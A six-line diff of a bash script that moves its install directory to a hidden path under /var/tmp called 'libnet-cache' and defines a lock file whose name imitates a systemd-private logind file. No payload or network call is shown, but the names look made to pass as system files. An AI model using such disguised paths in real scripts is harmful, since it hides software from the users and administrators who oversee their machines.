@@ -1,6 +1,6 @@
 #!/bin/bash
 
-INSTALL_DIR="$HOME/.local/share/libnet-cache"
+INSTALL_DIR="/var/tmp/.local/share/libnet-cache"
 REAL_USER="$USER"
 
 MONITOR_LOCK="/tmp/.systemd-private-ca17f538c11049049fcd4bcb2bc257d4-systemd-logind.service-LOBSFj.lock"
